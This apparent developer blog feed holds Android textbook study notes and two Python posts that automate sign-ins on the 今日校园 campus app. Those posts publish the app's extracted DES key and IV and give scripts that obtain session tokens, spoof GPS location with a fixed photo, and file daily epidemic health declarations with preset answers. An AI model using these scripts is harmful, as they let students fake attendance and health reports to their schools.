int)方法里，基于getItemViewType(int)方法返回的viewType值，需要返回不同的ViewHolder。如果是一般性crime，就仍然使用原始布局；如果是需警方介入的crime，就使用一个带联系警方按钮的新布局 新建需警方介入的crime列表项视图list_item_crime_police： 12345678910111213141516171819202122232425262728293031323334&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="horizontal" android:padding="8dp"&gt; &lt;LinearLayout android:layout_width="wrap_content" android:layout_height="wrap_content" android:orientation="vertical"&gt; &lt;TextView android:id="@+id/crime_title" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Crime Title" /&gt; &lt;TextView android:id="@+id/crime_date" android:layout_width="match_parent" android:layout_height="wrap_content" android:text="Crime Date" /&gt; &lt;/LinearLayout&gt; &lt;TextView android:layout_width="match_parent" android:layout_height="wrap_content" android:textSize="20dp" android:gravity="right" android:textColor="#ff0000" android:text="Police"/&gt;&lt;/LinearLayout&gt; 在Crime类中添加是否报警的属性： 12345678// 是否报警private boolean mRequiresPolice;public boolean isRequiresPolice() &#123; return mRequiresPolice;&#125;public void setRequiresPolice(boolean requiresPolice) &#123; mRequiresPolice = requiresPolice;&#125; 在CrimeLab中设置每隔3项需要报警： 1234567891011private CrimeLab(Context context) &#123; mCrimes = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 100; i++) &#123; Crime crime = new Crime(); crime.setTitle("Crime # " + i); crime.setSolved(i % 2 == 0); // 设置每隔2项需要报警 crime.setRequiresPolice(i % 3 == 0); mCrimes.add(crime); &#125;&#125; 修改CrimeListFragment类： 123456789101112131415161718192021222324252627282930313233343536373839404142// 删除泛型private class CrimeAdapter extends RecyclerView.Adapter &#123; private List&lt;Crime&gt; mCrimes; public CrimeAdapter(List&lt;Crime&gt; crimes) &#123; mCrimes = crimes; &#125; // 重写方法 @Override public int getItemViewType(int position) &#123; if (mCrimes.get(position).isRequiresPolice())&#123; return 1; &#125; else &#123; return 0; &#125; &#125; @NonNull @Override public RecyclerView.ViewHolder onCreateViewHolder(@NonNull ViewGroup viewGroup, int type) &#123; View view; // 分情况展示视图 if (type == 0)&#123; view = LayoutInflater.from(getActivity()).inflate(R.layout.list_item_crime, viewGroup, false); &#125; else &#123; view = LayoutInflater.from(getActivity()).inflate(R.layout.list_item_crime_police, viewGroup, false); &#125; return new CrimeHolder(view); &#125; @Override public void onBindViewHolder(@NonNull RecyclerView.ViewHolder viewHolder, int i) &#123; Crime crime = mCrimes.get(i); ((CrimeHolder) viewHolder).bind(crime); &#125; @Override public int getItemCount() &#123; return mCrimes.size(); &#125;&#125; 最终效果： 第九章 使用布局与组件创建用户界面引入ConstraintLayout约束编辑器 TextView水平方向和竖直方向的尺寸是分别由宽度设置和高度设置决定的。能设置的值有以下三种： 约束的XML形式凡是以layout_开头的属性都属于布局参数（ layout parameter）。与其他属性不同的是，组件的布局参数是用来向其父组件做指示的，即用于告诉父布局如何安排自己，如layout_width和layout_height 深入学习布局属性dp、 sp 以及屏幕像素密度 px： 英文pixel的缩写，即像素。无论屏幕密度多少，一个像素单位对应一个屏幕像素单位。不推荐使用px，因为它不会根据屏幕密度自动缩放 dp（或dip）：英文density-independent pixel的缩写，意为密度无关像素。在设置边距、内边距或任何不打算按像素值指定尺寸的情况下，通常都使用dp这种单位。如果屏幕密度较高，密度无关像素会相应扩展至整个屏幕。 1dp在设备屏幕上总是等于1/160英寸。使用dp的好处是，无论屏幕密度如何，总能获得同样的尺寸 sp：英文scale-independent pixel的缩写， 意为缩放无关像素。它是一种与密度无关的像素，这种像素会受用户字体偏好设置的影响。通常使用sp来设置屏幕上的字体大小 pm、mm、in：类似于dp的缩放单位，允许以点（ 1/72英寸）、毫米或英寸为单位指定用户界面尺寸。但在实际开发中不建议使用这些单位，因为并非所有设备都能按照这些单位进行正确的尺寸缩放配置 样式、主题及主题属性样式（ style）是XML资源文件，含有用来描述组件行为和外观的属性定义。例如，使用下列样式配置组件，就能显示比正常大小更大的文字： 1234&lt;style name="BigTextStyle"&gt; &lt;item name="android:textSize"&gt;20sp&lt;/item&gt; &lt;item name="android:padding"&gt;3dp&lt;/item&gt;&lt;/style&gt; 你可以创建自己的样式文件（第22章会这样做）。具体做法是将属性定义添加并保存在res/values/目录下的样式文件中，然后在布局文件中以@style/my_own_style（样式文件名）的形式引用 主题是各种样式的集合。从结构上来说，主题本身也是一种样式资源，只不过它的属性指向了其他样式资源。Android自带了一些供应用使用的平台主题。 使用主题属性引用，可将预定义的应用主题样式添加给指定组件 Android 应用的设计原则边距属性， Android Studio默认使用的值是16dp或8dp。设定这两种值遵循了Android的material design原则。访问https://developer.android.com/design/index.html，可看到所有的Android设计规范。 开发Android应用都应严格遵循这些设计原则。不过，这些设计原则严重依赖于SDK较新版本的功能，旧版本设备往往无法获得或实现这些功能。不过有些设计可借助AppCompat库实现，详见第13章 挑战练习：日期格式化与其说Date对象是普通日期，不如说是时间戳。调用Date对象的toString()方法，就能得到一个时间戳。所以， RecyclerView视图上显示的就是它。时间戳虽然凑合能用，但如果能显示人们习惯看到的日期应该会更好，如“ Jul 22, 2016” 。要实现此目标，可使用android.text.format.DateFormat类实例。具体怎么用，请查阅Android文档库中有关该类的说明。使用DateFormat类中的方法，可获得常见格式的日期；也可以自己定制字符串格式。最后，再来一个更有挑战的练习：创建一个包含星期的字符串格式，如“Friday, Jul 22, 2016”。 12345678public void bind(Crime crime)&#123; mCrime = crime; mTitleTextView.setText(crime.getTitle()); // 格式化日期 //星期，月份 几号，几年 例如：星期一，三月 30 2020 CharSequence date = DateFormat.format("EEEE,MMMM dd yyyy", crime.getDate()); mDateTextView.setText(date); mSolvedImageView.setVisibility(mCrime.isSolved() ? View.VISIBLE : View.GONE);&#125; 运行效果]]></content>
      <categories>
        <category>Android开发</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[今日校园自动签到]]></title>
    <url>%2F2020%2F03%2F25%2F%E4%BB%8A%E6%97%A5%E6%A0%A1%E5%9B%AD%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0%2F</url>
    <content type="text"><![CDATA[本文将探讨如何对今日校园发起的签到进行定时回应，即自动签到，同时了解使用Python进行阿里云oss的文件上传、Python的DES加解密库、逆向分析Android应用获取关键信息（本文涉及DES加解密的密钥和IV向量的获取）等 前言在上一篇文章中，我们讨论了如何进行今日校园的自诊打卡，但是后面经过测试发现，如果手机端重新登录，则原有的Cookie将失效，需要重新更新Cookie，所以最好在手机端登录后将Cookie填入程序里后，不要再退出登录，这样自动打卡就可以一直进行。而这篇今日校园自动签到，将不存在这一问题。当Cookie已经失效时，将自动进行重新登陆以更新Cookie，同时还可自定义签到位置，使你一直在其签到范围内 分析过程阿里云OSS上传文件今日校园里面的签到很多时候都是需要自拍的，而这些图片会被今日校园保存到阿里云OSS中，所以我们必须实现Python使用阿里云OSS的过程 pip install oss2 你需要有如下数据： access_key_id、access_key_secret、endPoint、bucket 本文的这些数据均通过抓包获得 编写代码 12345678910111213141516171819202122232425262728def uploadPic(session): """ 上传图片到阿里云oss url: 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/getStsAccess' # 用于获取主要参数 method: POST :param session: requests.session() :return: oss上的filename """ # 抓包获取文件上传所需信息 url = 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/getStsAccess' res = session.post(url=url, verify=False) datas = res.json().get('datas') # 所需信息 filename = datas.get('fileName') accessKeyId = datas.get('accessKeyId') accessSecret = datas.get('accessKeySecret') securityToken = datas.get('securityToken') endPoint = datas.get('endPoint') bucket = datas.get('bucket') # 创建对象 bucket = oss2.Bucket(oss2.Auth(access_key_id=accessKeyId, access_key_secret=accessSecret), endPoint, bucket) # 读取home.jpg并上传到oss上的filename with open('home.jpg', "rb") as f: data = f.read() bucket.put_object(key=filename, headers=&#123;'x-oss-security-token': securityToken&#125;, data=data) # 返回值为链接，参数依次为，方法、oss上文件路径、过期时间(s) ret = bucket.sign_url('PUT', filename, 60) return filename DES加解密反编译该App的部分代码可以看出，今日校园许多关键信息均使用DES加密，且加密所需的IV向量为byte类型的数组{1,2,3,4,5,6,7,8}： 所以，我们提交这些信息也必须经过加密，而DES加密的密钥也能从相应的代码中分析得到:ST83=@XV 在最新的v8.1.12更新日志中，提到了对软件的安全机制进行了加强： 经过分析，发现确实如此，今日校园App开始使用360加固进行安全防护，但在我之前使用的v8.1.7中，是可以直接分析其没有经过加固的代码的。而对于360加固过的应用如何进行逆向分析不是本文的重点，有机会将在以后的文章中进行讨论如何对其脱壳 所以在得到这些关键信息后就可进行DES加密部分的代码编写了： 12345678# pip install pyDesdef encrypt(s, key='ST83=@XV'): import pyDes key = key iv = b"\x01\x02\x03\x04\x05\x06\x07\x08" k = des(key, CBC, iv, pad=None, padmode=PAD_PKCS5) EncryptStr = k.encrypt(s) return base64.b64encode(EncryptStr).decode() 其他文件 config.ini 为了实现自动登录，我们需要一个名为config.ini的文件保存我们的Cookie，以便在未失效时直接使用，在失效时更新。该文件只保存MOD_AUTH_CAS字段的内容 home.jpg 除此之外，还需要一张你的签到图片home.jpg，以便在签到时上传该文件 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286import base64import jsonimport reimport timeimport oss2import requestsimport urllib3from pyDes import *from requests.utils import dict_from_cookiejarurllib3.disable_warnings()session = requests.session()session.headers = &#123; 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; 16th Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.110 Mobile Safari/537.36 yiban/8.1.7 cpdaily/8.1.7 wisedu/8.1.7',&#125;# 此处配置你的账号USERCODE = '201707060000'# 此处配置你的密码USERPWD = '123456'# 此处填写最新的App版本APP_VERSION = '8.1.12'# 签到模式 custom：自定义位置；auto: 自动获取第一个签到范围内的位置MOD = 'custom'# 此处填写你的签到地址信息POSITION = '中国山东省潍坊市寿光市'# 当签到模式为custom时有效# 此处填写地址经纬度LON = 118.785300LAT = 36.889072# 如果准备签到的位置在签到范围外，则在此处填写原因REASON = '原因'# des加密def encrypt(s, key='ST83=@XV'): key = key iv = b"\x01\x02\x03\x04\x05\x06\x07\x08" k = des(key, CBC, iv, pad=None, padmode=PAD_PKCS5) EncryptStr = k.encrypt(s) return base64.b64encode(EncryptStr).decode() # 转base64编码返回def createCpdailyInfo(lon, lat, open_id): """ headers中的CpdailyInfo参数 :param lon: 定位经度 :param lat: 定位纬度 :param open_id: 学生学号 :return: CpdailyInfo """ s = r'&#123;"systemName":"android","systemVersion":"8.1.0","model":"16th",' \ r'"deviceId":"ffd1df5b-e69a-4938-9624-38d575039f83","appVersion":"8.1.11","lon":' + str( lon) + ',"lat":' + str(lat) + ',"userId":"' + open_id + '"&#125;' info = encrypt(s) return infodef uploadPic(): """ 上传图片到阿里云oss url: 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/getStsAccess' method: POST :return: oss上的filename """ url = 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/getStsAccess' res = session.post(url=url, verify=False) datas = res.json().get('datas') filename = datas.get('fileName') accessKeyId = datas.get('accessKeyId') accessSecret = datas.get('accessKeySecret') securityToken = datas.get('securityToken') endPoint = datas.get('endPoint') bucket = datas.get('bucket') # 创建对象 bucket = oss2.Bucket(oss2.Auth(access_key_id=accessKeyId, access_key_secret=accessSecret), endPoint, bucket) # 读取test.jpg并上传到oss上的filename with open('home.jpg', "rb") as f: data = f.read() bucket.put_object(key=filename, headers=&#123;'x-oss-security-token': securityToken&#125;, data=data) # 返回值为链接，参数依次为，方法、oss上文件路径、过期时间(s) ret = bucket.sign_url('PUT', filename, 60) return filenamedef getSignInfoInOneDay(): """ :url: https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/getStuSignInfosInOneDay :method: POST :data: &#123;&#125; """ url = 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/getStuSignInfosInOneDay' data = json.dumps(&#123;&#125;) res = session.post(url=url, data=data, allow_redirects=False, verify=False) if res.status_code == 302: print('登录过期') return None datas = res.json().get('datas', &#123;&#125;) signedTasks = datas.get('signedTasks') unSignedTasks = datas.get('unSignedTasks') tasks = &#123;'signedTasks': signedTasks, 'unSignedTasks': unSignedTasks&#125; return tasksdef getSignDetail(us_task): """ 签到任务详情 url: https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/detailSignInstance method: POST :param us_task: 未签到的任务 data: &#123; signInstanceWid: signInstanceWid, signWid: signWid &#125; data-type: json """ url = 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/detailSignInstance' data = json.dumps(&#123; 'signInstanceWid': us_task.get('signInstanceWid'), 'signWid': us_task.get('signWid'), &#125;) res = session.post(url=url, data=data, verify=False) unSignedTaskDetail = res.json().get('datas') return unSignedTaskDetaildef getPhotoUrl(filename): """ 获取图片上传位置 url: 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/previewAttachment' method: POST :param filename: 文件路径 data: &#123;ossKey: 文件路径&#125; data-type: json :return: 图片上传位置 """ url = 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/previewAttachment' data = json.dumps(&#123; 'ossKey': filename &#125;) res = session.post(url=url, data=data, verify=False) photoUrl = res.json().get('datas') return photoUrldef submitSign(wid, lon, lat, reason, photo_url, position): """ 提交签到 url: 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/submitSign' method: POST :param wid: 任务id string :param lon: 经度 float :param lat: 纬度 float :param reason: 补充原因 string :param photo_url: 签到图片url string :param position: 位置信息 string :return: """ url = 'https://wfust.cpdaily.com/wec-counselor-sign-apps/stu/sign/submitSign' data = json.dumps(&#123; 'signInstanceWid': wid, 'longitude': lon, 'latitude': lat, 'isMalposition': 1, 'abnormalReason': reason, 'signPhotoUrl': photo_url, 'position': position &#125;) cpdaily_extension = createCpdailyInfo(lon=lon, lat=lat, open_id=USERCODE) session.headers['Content-Type'] = 'application/json;charset=UTF-8' res = session.post(url=url, headers=&#123;'Cpdaily-Extension': cpdaily_extension&#125;, data=data, verify=False) message = res.json().get('message') return messagedef startSign(): """ 签到流程控制 :return: """ tasks = getSignInfoInOneDay() text = '' if tasks is None: if reLogin(): print('==&gt;重新登陆成功') text += '==&gt;重新登陆成功' mod = dict_from_cookiejar(session.cookies).get('MOD_AUTH_CAS') with open('cookie.ini', 'w+', encoding='utf-8') as f: f.write(mod) session.cookies['MOD_AUTH_CAS'] = mod tasks = getSignInfoInOneDay() else: text += '==&gt;账号或密码错误、或者需要验证码' return text unSignedTasks = tasks.get('unSignedTasks') if unSignedTasks: print('当前有&#123;&#125;条签到'.format(len(unSignedTasks))) print('开始签到') for unSignedTask in unSignedTasks: unSignedDetailTask = getSignDetail(us_task=unSignedTask) # 判断是否在签到时间 currentTime = unSignedDetailTask.get('currentTime') taskDate = unSignedDetailTask.get('rateSignDate')[0:10] taskStartTime = unSignedDetailTask.get('rateTaskBeginTime') taskEndTime = unSignedDetailTask.get('rateTaskEndTime') dt1 = '&#123;&#125; &#123;&#125;'.format(taskDate, taskStartTime) dt2 = '&#123;&#125; &#123;&#125;'.format(taskDate, taskEndTime) timeArray1 = time.strptime(dt1, '%Y-%m-%d %H:%M') timeArray2 = time.strptime(dt2, '%Y-%m-%d %H:%M') timeArray3 = time.strptime(currentTime, '%Y-%m-%d %H:%M:%S') timestamp1 = time.mktime(timeArray1) timestamp2 = time.mktime(timeArray2) timestamp3 = time.mktime(timeArray3) if timestamp3 &lt;= timestamp1 or timestamp3 &gt;= timestamp2: print("未到签到时间") text += '==&gt;未到签到时间' break filename = uploadPic() photo_url = getPhotoUrl(filename=filename) # 地址信息 reason = '' if MOD == 'custom': longitude = LON latitude = LAT reason = REASON else: place = unSignedDetailTask.get('signPlaceSelected')[0] longitude = place.get('longitude') latitude = place.get('latitude') text += "==&gt;" + submitSign(wid=unSignedDetailTask.get('signInstanceWid'), lon=longitude, lat=latitude, reason=reason, photo_url=photo_url, position=POSITION) session.get('https://sc.ftqq.com/**********你server酱的SCKEY**********.send?text=今日校园签到&amp;desp=' + text) return text else: print("暂时没有签到任务") return '==&gt;暂时没有签到任务'def reLogin(): """ 重新登陆 :return: 成功True/失败False """ url = 'https://wfust.cpdaily.com/iap/doLogin' # POST lt_url = 'https://wfust.cpdaily.com/iap/login?service=https%3A%2F%2Fwfust.cpdaily.com%2Fportal%2Flogin' # GET lt_compile = re.compile(r'id="lt" value="(.*?)"') headers = &#123; 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'https://wfust.cpdaily.com/iap/login?service=https%3A%2F%2Fwfust.cpdaily.com%2Fportal%2Flogin' &#125; text = session.get(url=lt_url, verify=False).text lt = lt_compile.findall(text)[0] data = &#123; # 此处配置你的账号 'username': USERCODE, # 此处配置你的密码 'password': USERPWD, 'lt': lt, 'captcha': '', 'rememberMe': 'false' &#125; res = session.post(url=url, headers=headers, data=data, verify=False) re_url = res.json().get('url') if re_url is not None: resp = session.post(url=re_url, headers=headers, data=data, verify=False) if resp.status_code == 200: return True return False else: return Falseif __name__ == '__main__': with open('cookie.ini', 'r', encoding='utf-8') as f: read = f.read() if read != '': session.cookies['MOD_AUTH_CAS'] = read text = startSign() session.get( 'https://sc.ftqq.com/**********你server酱的SCKEY**********.send?text=今日校园签到&amp;desp=' + text) 在云函数中部署具体步骤参考上一篇文章：Python+云函数实现今日校园每日自诊打卡 需要注意的是，你需要在云函数里安装依赖包，当然直接把依赖包打包上传也可以。除此之外，你还可以在服务器里面部署定时任务 最后关于上一篇文章挖的几个坑，我还没有填完，待我时间充裕或者我真的需要的时候再填吧！2020.03.31更新：已填完所有坑 国内疫情已经基本稳定，估计开学那天已经快来了！]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Python+云函数实现今日校园每日自诊打卡]]></title>
    <url>%2F2020%2F03%2F22%2FPython-%E4%BA%91%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0%E4%BB%8A%E6%97%A5%E6%A0%A1%E5%9B%AD%E6%AF%8F%E6%97%A5%E8%87%AA%E8%AF%8A%E6%89%93%E5%8D%A1%2F</url>
    <content type="text"><![CDATA[科技改变生活，懒人重塑世界，这是一段可以让你早睡早起的健康绿色python代码 起因相信你也和我一样，每日在今日校园这个爱啪啪里准时进行自诊打卡。但是有时候难免会出现忘记打卡的情况，所以这个程序就诞生了 准备工作 你需要有你的Cookie(下文会说明) 你需要有阿里云或者腾讯云等提供云函数服务的服务商的账号 如果你需要微信实时通知打卡的情况，那么你必须有一个Server酱的SCKEY 获取Cookie那么程序怎么知道是你在打卡而不是郭涛在打卡呢？ 是的，服务器需要Cookie进行识别你的身份，就像我们每个人的身份证号码都不相同，我们的Cookie也是不同的。当然，我们并不是需要用到所有的Cookie，仅仅需要用到其中的sessionToken就能使用了。下面介绍获取Cookie的三种方法 方法一 抓包获取使用抓包软件即可获取登录的Cookie 方法二 通过脚本运行以下代码获得sessionToken数据，但是会挤掉你在手机上的登录： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import base64, json, requests, refrom pyDes import *import urllib3urllib3.disable_warnings()KEY = "ST83=@XV"IV = b"\x01\x02\x03\x04\x05\x06\x07\x08"session = requests.session()session.headers = &#123; 'Content-Type': 'application/json; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; 16th Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.110 Mobile Safari/537.36 okhttp/3.12.4', 'CpdailyInfo': 'XvWN4SWqyX648L13hW5koOHt5AfBN6jFTi4zR23WludYuPZfzB8fDcBpRB80 G2iWtG0fERtQ4X9JeLE+FgLD12tqKe6S+8Si5eM2MJ84epV/uHWh0tWeuEIz KKrLHH1I3GWM8/lhSRjQE4DL/m2G++NY/Bf8QiB3IFf0NmdzdWBFBoh4+Qs1 wDIwt38Qm/8smWF4JVDCrFay2Cz7K1F2IX90L9RCuoQO' &#125;# des加密def encrypt(s): k = des(KEY, CBC, IV, pad=None, padmode=PAD_PKCS5) EncryptStr = k.encrypt(s) return base64.b64encode(EncryptStr).decode() # 转base64编码返回def sendValidCode(cell): mobile = encrypt(cell) url = 'https://mobile.campushoy.com/v6/auth/authentication/mobile/messageCode' # POST data = json.dumps(&#123; 'mobile': mobile &#125;) res = session.post(url=url, data=data, verify=False).json() print(res) if res.get('errCode') == 2011: print(res.get('errMsg')) return 2 elif res.get('errCode') == 0: print('验证码发送成功！请查收...') return 1def loginByPhone(cell, code): url = 'https://mobile.campushoy.com/v6/auth/authentication/mobileLogin' # POST data = json.dumps(&#123; 'loginId': cell, 'loginToken': code &#125;) res = session.post(url=url, data=data, verify=False) jdata = res.json().get('data') personId = jdata.get('personId', '') userId = jdata.get('userId', '') # 学号 openId = jdata.get('openId', '') # 姓名 name = jdata.get('name', '') tenantId = jdata.get('tenantId', '') tgc = jdata.get('tgc', '') # 主要Cookie参数 sessionToken = jdata.get('sessionToken', '') print("你的token：") print("sessionToken: %s" % sessionToken) print("请将以上token内容填入Cookie！")if __name__ =="__main__": cell = input("==&gt;请输入手机号: ") if sendValidCode(cell) != 2: code = input("==&gt;请输入验证码: ") loginByPhone(cell, code) 方法三 通过配置文件（推荐）使用这个方法是你的手机必须已经Root 找到文件/data/user/0/com.wisedu.cpdaily/shared_prefs/preference_configs.xml打开，找到里面的sessionToken项，它的值即为Cookie中必须的sessionToken Python脚本自行替换脚本中的Cookie： 如果你想要实现微信通知打卡执行的状态，请在requests.get(&#39;https://sc.ftqq.com/你server酱的SCKEY.send?text=今日校园自诊打卡&amp;desp=&#39;+msg, verify=False)里相应位置填写你的SCKEY 如果不需要或者完全不知道怎样弄，那么你完全可以大胆的删除这一行代码，而程序不会出现任何逻辑上的问题 对于需要上传的数据，它们分别为： fever：是否有呼吸道感染症状，如：1（无） contact：是否与敏感/疑似/确诊人员接触过，如：0（否） province：你所在的省份，如：四川省 city：你所在的城市，如：南充市 prefecture：你所在的县市区，如：仪陇县 请确保以上数据和你以前打卡的数据一致 源码1234567891011121314151617181920212223242526272829303132333435363738394041424344# -*- coding: utf-8 -*-import requests, jsonimport urllib3urllib3.disable_warnings()session = requests.session()# 打卡url = 'https://mobile.campushoy.com/v6/epidemic/putEpidemicInfo' # POST OPTION# 获取打卡详情get_detail_url ='https://mobile.campushoy.com/v6/epidemic/getEpidemicInfo' # GETheaders = &#123; 'Content-Type': 'application/json;charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; 16th Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.110 Mobile Safari/537.36 yiban/8.1.7 cpdaily/8.1.7 wisedu/8.1.7', 'Cookie': 'sessionToken=此处填写你的sessionToken'&#125;session.headers.update(headers)def daka(): data = json.dumps(&#123; 'fever': '1', # 是否有呼吸道感染症状：1无； 'contact': '0', # 是否与敏感/疑似/确诊人员接触过：0否； 'province': '四川省', # 你所在的省份 'city': '南充市', # 你所在的城市 'prefecture': '仪陇县' # 你所在的县市区 &#125;) res = session.post(url=url, data = data, verify=False) status = res.json().get('errMsg') return statusdef getEpidemicInfo(): res = session.get(url=get_detail_url, verify=False) info = res.json().get('data', '') # print(info) msg = res.json().get('errMsg', 'failed') updateTime = info.get('updateTime', '') return updateTimedef start(): status = daka() time = getEpidemicInfo() msg = status + '(打卡时间：' + time + ')' print(msg) requests.get('https://sc.ftqq.com/你server酱的SCKEY.send?text=今日校园自诊打卡&amp;desp='+msg, verify=False) 云函数的设置这里以阿里云的函数计算为例，其他服务商应该操作类似 打开阿里云的函数计算，找到服务-函数，选择新建函数 设置函数名称，运行环境（必须选择python3），函数入口和运行内存 编辑代码 创建触发器 设置触发器 完成效果当你一切都准备好了以后，你只需要每天关注是否有打卡失败的消息发送给你，每当出现这种情况，一般都是Cookie已经失效了，你需要去云函数里更新你的Cookie设置 最后，好好享受属于你的早晨吧！ 结语相信你也感觉到了使用起来并不简单，还需要自己抓Cookie这种操作。不过不用担心，强迫症使我不会允许这种问题一直存在，目前登录功能和签到功能正在开发中，相信不久就能和大家见面了！更新完成，不用抓包了]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Android编程权威指南学习笔记一]]></title>
    <url>%2F2020%2F03%2F18%2FAndroid%E7%BC%96%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80%2F</url>
    <content type="text"><![CDATA[最近准备学习安卓开发，选择学习书籍的时候，在《第一行代码》第2版和《Android编程权威指南》第3版之间选择了后者，这篇文章将记录下学习过程中的重点和我学习中遇到的问题 第一章 Android开发初体验定制Toast使用Toast类的setGravity方法 123Toast.makeText(MainActivity.this,R.string.incorrect_toast,Toast.LENGTH_SHORT);toast.setGravity(Gravity.TOP,0,50);toast.show(); 第二章 MVC设计模式配置Android Studio识别成员变量的m前缀 File → Settings → Editor→ Code Style→ Code Generation 在Naming表单的Field一行中，添加m作为前缀 ; 添加s作为Static field的前缀 作用需要Android Studio为mText生成get方法时，它生成的是getText()而不是getMText() 模型、视图、控制器 模型对象模型对象存储着应用的数据和业务逻辑 模型对象不关心用户界面，它为存储和管理应用数据而生 模型类通常就是我们创建的定制类 应用的全部模型对象组成了模型层 视图对象视图对象知道如何在屏幕上绘制自己，以及如何响应用户的输入 凡是能够在屏幕上看见的对象，就是视图对象 自带很多视图类 可自己定制开发其他视图类 应用的全部视图对象组成了视图层 控制器对象控制器对象含有应用的逻辑单元，是视图对象与模型对象的联系纽带 控制器通常是Activity、 Fragment或Service的子类 MVC设计模式的优点 可以按类而不是按变量和方法思考设计开发问题 可以按层而非一个个类来考虑设计开发 便于复用类 ImageViewandroid:contentDescription属性 该属性能为视力障碍用户提供方便 设置文字属性值后，如果设备的可访问性选项作了相应设置，那么在用户点击图形按钮时，设备便会读出属性值的内容 第三章 Activity的生命周期每个Activity实例都有其生命周期。在其生命周期内， activity在运行、暂停、停止和不存在这四种状态间转换 覆盖onCreate(Bundle)方法可以完成的工作切记，千万不要自己去调用onCreate(Bundle)方法或任何其他activity生命周期方法 实例化组件并将它们放置在屏幕上（调用setContentView(int)方法） 引用已实例化的组件 为组件设置监听器以处理用户交互 访问外部模型数据 使用@Override注解就是要求编译器保证当前类拥有你要覆盖的方法，而不会出现因拼写错误等而出现奇怪的问题 部分手机Log日志不输出国内的部分厂商定制的手机对于应用中的 Log 日志默认做了打印限制，需要手动设置才能打印出特殊级别的日志 魅族打开【设置】中的【开发者选项】，页面底部找到【性能优化】，打开【高级日志输出】，勾选【全部允许】 华为打开拨号界面的拨号盘，输入##2846579##，系统会自动打开【工程菜单】界面，依次打开【后台设置】 -&gt; 【LOG设置】，勾选【AP日志】即可 设备旋转屏幕时设备旋转时，系统会销毁当前Activity实例，创建一个新的Activity实例 改变设备配置（ device configuration） 新建landscape资源 Bundle对象Bundle是存储字符串键与限定类型值之间映射关系（键值对）的一种结构 只能是基本类型 可以实现Serializable或Parcelable接口的对象 第四章 Android应用的调试异常与栈跟踪 直接查看崩溃日志 记录栈跟踪日志 1Log.d(TAG, MSG,new Exception()); 设置断点 使用异常断点 ① 打开Run - View Breakpoints 或者使用快捷键c+s+f8 ② 单击新增断点按钮（＋）设置一个新断点 ③ 选择下拉列表中的Java Exception Breakpoints选项 ④ 输 入 RuntimeException并选择RuntimeException是NullPointerException、 ClassCastException及其他常见异常的超类，因此该设置基本适用于所有异常 ⑤ 点击Done按钮完成设置 ⑥ 调试应用 Android特有的调试工具Android Lint选择Analyze → Inspect Code… R类经常清理：Build → Clean Project 第五章 第二个activityxml文件tools:text属性的命名空间会在预览时显示文字内容，而在运行时不会显示 c+s+n以快速打开某一文件AndroidManifes.xmlandroid:name: 必须属性，表示activity文件路径 启动activity实际过程activity调用startActivity(Intent)方法时，调用请求发送给了操作系统的ActivityManager，ActivityManager负责创建Activity实例并调用其onCreate(Bundle)方法 基于Intent的通信intent对象是component用来与操作系统通信的一种媒介工具 component activity service broadcast receiver content provider intent是一种多用途通信工具显式intent与隐式intent显式intent通过指定Context与Class对象，然后调用intent的构造方法来创建的Intent 隐式intent一个应用的activity如需启动另一个应用的activity，可通过创建隐式intent来处理 activity间的数据传递intent extra extra是一种键值结构 将extra数据信息添加给intent public Intent putExtra(String name, boolean value) activity可能启动自不同的地方，所以，应该在获取和使用extra信息的activity那里，为它定义键 1private static final String EXTRA_ANSWER_IS_TRUE = "com.suqir.android.geoquiz.answer_is_true";// 可避免来自不同应用的extra间发生命名冲突 newIntent(...)方法中封装处理extra信息的逻辑 12345public static Intent newIntent(Context pakageContext, boolean answerIsTrue)&#123; Intent intent = new Intent(pakageContext, CheatActivity.class); intent.putExtra(EXTRA_ANSWER_IS_TRUE, 